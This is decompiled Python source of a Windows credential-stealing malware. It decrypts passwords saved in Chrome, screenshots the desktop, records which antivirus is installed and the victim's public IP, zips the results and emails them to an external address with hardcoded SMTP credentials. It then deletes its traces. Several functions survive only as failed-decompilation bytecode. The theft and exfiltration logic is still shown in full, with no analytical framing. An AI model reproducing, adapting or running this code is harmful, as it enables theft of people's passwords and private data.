# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: doc_details.py
import os, sys, shutil, sqlite3, win32crypt, json, base64, requests, platform, zipfile, smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
addr_from = 'info@coinstradeoption.org'
addr_to = 'Zivabella181@yahoo.com'
password = 'kingcode333???'
from PIL import ImageGrab
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = 'Google\\Chrome\\User Data\\Default\\Login Data'
NONCE_BYTE_SIZE = 12

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def get_cipher(key):
    cipher = Cipher((algorithms.AES(key)),
      None,
      backend=(default_backend()))
    return cipher


def dpapi_decrypt(encrypted):
    import ctypes, ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
         (
          'cbData', ctypes.wintypes.DWORD),
         (
          'pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def unix_decrypt(encrypted):
    if sys.platform.startswith('linux'):
        password = 'peanuts'
        iterations = 1
    else:
        raise NotImplementedError
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    salt = 'saltysalt'
    iv = '                '
    length = 16
    key = PBKDF2(password, salt, length, iterations)
    cipher = AES.new(key, (AES.MODE_CBC), IV=iv)
    decrypted = cipher.decrypt(encrypted[3:])
    return decrypted[:-ord(decrypted[(-1)])]


def get_key_from_local_state--- This code section failed: ---

 L.  94         0  LOAD_CONST               None
                2  STORE_FAST               'jsn'

 L.  95         4  LOAD_GLOBAL              open
                6  LOAD_GLOBAL              os
                8  LOAD_ATTR                path
               10  LOAD_METHOD              join
               12  LOAD_GLOBAL              os
               14  LOAD_ATTR                environ
               16  LOAD_STR                 'LOCALAPPDATA'
               18  BINARY_SUBSCR    

 L.  96        20  LOAD_STR                 'Google\\Chrome\\User Data\\Local State'

 L.  95        22  CALL_METHOD_2         2  ''

 L.  96        24  LOAD_STR                 'utf-8'
               26  LOAD_STR                 'r'

 L.  95        28  LOAD_CONST               ('encoding', 'mode')
               30  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               32  SETUP_WITH           68  'to 68'

 L.  96        34  STORE_FAST               'f'

 L.  97        36  LOAD_GLOBAL              json
               38  LOAD_METHOD              loads
               40  LOAD_GLOBAL              str
               42  LOAD_FAST                'f'
               44  LOAD_METHOD              readline
               46  CALL_METHOD_0         0  ''
               48  CALL_FUNCTION_1       1  ''
               50  CALL_METHOD_1         1  ''
               52  STORE_FAST               'jsn'
               54  POP_BLOCK        
               56  LOAD_CONST               None
               58  DUP_TOP          
               60  DUP_TOP          
               62  CALL_FUNCTION_3       3  ''
               64  POP_TOP          
               66  JUMP_FORWARD         84  'to 84'
             68_0  COME_FROM_WITH       32  '32'
               68  <49>             
               70  POP_JUMP_IF_TRUE     74  'to 74'
               72  <48>             
             74_0  COME_FROM            70  '70'
               74  POP_TOP          
               76  POP_TOP          
               78  POP_TOP          
               80  POP_EXCEPT       
               82  POP_TOP          
             84_0  COME_FROM            66  '66'

 L.  98        84  LOAD_FAST                'jsn'
               86  LOAD_STR                 'os_crypt'
               88  BINARY_SUBSCR    
               90  LOAD_STR                 'encrypted_key'
               92  BINARY_SUBSCR    
               94  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `DUP_TOP' instruction at offset 58


def aes_decrypt(encrypted_txt):
    encoded_key = get_key_from_local_state()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi_decrypt(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = get_cipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class ChromePassword:

    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.show_password(_temp_path)

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                pass
            else:
                name = row[1]
                value = self.chrome_decrypt(row[2])
                _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' % (host, name, value)
                self.passwordList.append(_info)
        else:
            conn.close()
            os.remove(db_file)

    def chrome_decrypt--- This code section failed: ---

 L. 136         0  LOAD_GLOBAL              sys
                2  LOAD_ATTR                platform
                4  LOAD_STR                 'win32'
                6  COMPARE_OP               ==
                8  POP_JUMP_IF_FALSE   114  'to 114'

 L. 137        10  SETUP_FINALLY        92  'to 92'

 L. 138        12  LOAD_FAST                'encrypted_txt'
               14  LOAD_CONST               None
               16  LOAD_CONST               4
               18  BUILD_SLICE_2         2 
               20  BINARY_SUBSCR    
               22  LOAD_CONST               b'\x01\x00\x00\x00'
               24  COMPARE_OP               ==
               26  POP_JUMP_IF_FALSE    46  'to 46'

 L. 139        28  LOAD_GLOBAL              dpapi_decrypt
               30  LOAD_FAST                'encrypted_txt'
               32  CALL_FUNCTION_1       1  ''
               34  STORE_FAST               'decrypted_txt'

 L. 140        36  LOAD_FAST                'decrypted_txt'
               38  LOAD_METHOD              decode
               40  CALL_METHOD_0         0  ''
               42  POP_BLOCK        
               44  RETURN_VALUE     
             46_0  COME_FROM            26  '26'

 L. 141        46  LOAD_FAST                'encrypted_txt'
               48  LOAD_CONST               None
               50  LOAD_CONST               3
               52  BUILD_SLICE_2         2 
               54  BINARY_SUBSCR    
               56  LOAD_CONST               b'v10'
               58  COMPARE_OP               ==
               60  POP_JUMP_IF_FALSE    88  'to 88'

 L. 142        62  LOAD_GLOBAL              aes_decrypt
               64  LOAD_FAST                'encrypted_txt'
               66  CALL_FUNCTION_1       1  ''
               68  STORE_FAST               'decrypted_txt'

 L. 143        70  LOAD_FAST                'decrypted_txt'
               72  LOAD_CONST               None
               74  LOAD_CONST               -16
               76  BUILD_SLICE_2         2 
               78  BINARY_SUBSCR    
               80  LOAD_METHOD              decode
               82  CALL_METHOD_0         0  ''
               84  POP_BLOCK        
               86  RETURN_VALUE     
             88_0  COME_FROM            60  '60'
               88  POP_BLOCK        
               90  JUMP_ABSOLUTE       146  'to 146'
             92_0  COME_FROM_FINALLY    10  '10'

 L. 144        92  DUP_TOP          
               94  LOAD_GLOBAL              WindowsError
               96  <121>               110  ''
               98  POP_TOP          
              100  POP_TOP          
              102  POP_TOP          

 L. 145       104  POP_EXCEPT       
              106  LOAD_CONST               None
              108  RETURN_VALUE     
              110  <48>             
              112  JUMP_FORWARD        146  'to 146'
            114_0  COME_FROM             8  '8'

 L. 147       114  SETUP_FINALLY       126  'to 126'

 L. 148       116  LOAD_GLOBAL              unix_decrypt
              118  LOAD_FAST                'encrypted_txt'
              120  CALL_FUNCTION_1       1  ''
              122  POP_BLOCK        
              124  RETURN_VALUE     
            126_0  COME_FROM_FINALLY   114  '114'

 L. 149       126  DUP_TOP          
              128  LOAD_GLOBAL              NotImplementedError
              130  <121>               144  ''
              132  POP_TOP          
              134  POP_TOP          
              136  POP_TOP          

 L. 150       138  POP_EXCEPT       
              140  LOAD_CONST               None
              142  RETURN_VALUE     
              144  <48>             
            146_0  COME_FROM           112  '112'

Parse error at or near `<121>' instruction at offset 96

    def save_passwords--- This code section failed: ---

 L. 153         0  LOAD_GLOBAL              open
                2  LOAD_STR                 'C:\\ProgramData\\Passwords.txt'
                4  LOAD_STR                 'w'
                6  LOAD_STR                 'utf-8'
                8  LOAD_CONST               ('encoding',)
               10  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               12  SETUP_WITH           42  'to 42'
               14  STORE_FAST               'f'

 L. 154        16  LOAD_FAST                'f'
               18  LOAD_METHOD              writelines
               20  LOAD_FAST                'self'
               22  LOAD_ATTR                passwordList
               24  CALL_METHOD_1         1  ''
               26  POP_TOP          
               28  POP_BLOCK        
               30  LOAD_CONST               None
               32  DUP_TOP          
               34  DUP_TOP          
               36  CALL_FUNCTION_3       3  ''
               38  POP_TOP          
               40  JUMP_FORWARD         58  'to 58'
             42_0  COME_FROM_WITH       12  '12'
               42  <49>             
               44  POP_JUMP_IF_TRUE     48  'to 48'
               46  <48>             
             48_0  COME_FROM            44  '44'
               48  POP_TOP          
               50  POP_TOP          
               52  POP_TOP          
               54  POP_EXCEPT       
               56  POP_TOP          
             58_0  COME_FROM            40  '40'

Parse error at or near `DUP_TOP' instruction at offset 32


if __name__ == '__main__':
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
if os.path.exists('C:\\Program Files\\Windows Defender'):
    av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
    av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
    av = 'AVG'
if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
    av = 'Avira'
if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
    av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
    av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
    av = 'Comodo'
if os.path.exists('C:\\Program Files\\DrWeb'):
    av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
    av = 'ESET'
if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
    av = 'Grizzly Pro'
if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
    av = 'Kaspersky'
if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
    av = 'Malware fighter'
if os.path.exists('C:\\Program Files\\360\\Total Security'):
    av = '360 Total Security'
else:
    screen = ImageGrab.grab()
    screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
    screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
    screen.close()
    zname = 'C:\\\\ProgramData\\\\Passwords.zip'
    newzip = zipfile.ZipFile(zname, 'w')
    newzip.write('C:\\\\ProgramData\\\\Passwords.txt')
    newzip.write('C:\\\\ProgramData\\\\Screenshot.jpg')
    newzip.close()
    os.remove('C:\\ProgramData\\Passwords.txt')
    os.remove('C:\\ProgramData\\Screenshot.jpg')
    msg = MIMEMultipart()
    msg['From'] = addr_from
    msg['To'] = addr_to
    msg['Subject'] = 'Catched By Great Code! - ' + os.getlogin()
    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    body = 'Catched By Great Coder! ✔️\n\nPC » ' + os.getlogin() + '\nOS » ' + platform.system() + ' ' + platform.release() + '\n' + '\nAV » ' + av + '\n\nIP » ' + IP
    msg.attach(MIMEText(body, 'plain'))
    filename = 'Passwords.zip'
    attachment = open('C:\\ProgramData\\Passwords.zip', 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment; filename= %s' % filename)
    msg.attach(p)
    server = smtplib.SMTP('mail.coinstradeoption.org', 587)
    server.starttls()
    server.login(addr_from, password)
    server.send_message(msg)
    server.quit()
    attachment.close()
    os.remove('C:\\ProgramData\\Passwords.zip')